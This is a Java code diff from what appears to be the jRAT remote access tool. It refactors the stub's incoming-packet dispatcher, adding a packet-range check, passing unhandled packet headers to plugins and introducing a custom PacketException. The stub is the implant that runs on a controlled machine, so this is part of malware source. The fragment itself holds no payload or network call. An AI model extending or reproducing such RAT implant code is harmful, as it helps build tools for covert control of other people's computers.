@@ -3,6 +3,8 @@ package pro.jrat.stub.packets.incoming;
 import java.util.HashMap;
 import java.util.Set;
 
+import pro.jrat.common.PacketRange;
+import pro.jrat.common.exceptions.PacketException;
 import pro.jrat.stub.Plugin;
 
 
@@ -106,28 +108,24 @@ public abstract class AbstractIncomingPacket {
 
 	public static final void execute(byte header) {
 		try {
-			for (Plugin p : Plugin.list) {
-				p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
-			}
-
 			AbstractIncomingPacket packet = null;
 			Set<Byte> set = incomingPackets.keySet();
-			for (byte str : set) {
-				if (str == header) {
-					packet = incomingPackets.get(str).newInstance();
+			for (byte b : set) {
+				if (b == header) {
+					packet = incomingPackets.get(b).newInstance();
 					break;
 				}
 			}
 
-			if (packet != null) {
-				try {
-					packet.read();
-				} catch (Exception ex) {
-					throw ex;
+			if (packet != null && header <= PacketRange.incomingStubRange) {
+				packet.read();
+			} else {
+				for (Plugin p : Plugin.list) {
+					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
 				}
 			}
 		} catch (Exception ex) {
-			Exception ex1 = new Exception("Failed to handle packet " + header, ex);
+			PacketException ex1 = new PacketException("Failed to handle packet " + header, ex);
 			ex1.printStackTrace();
 		}
 	}
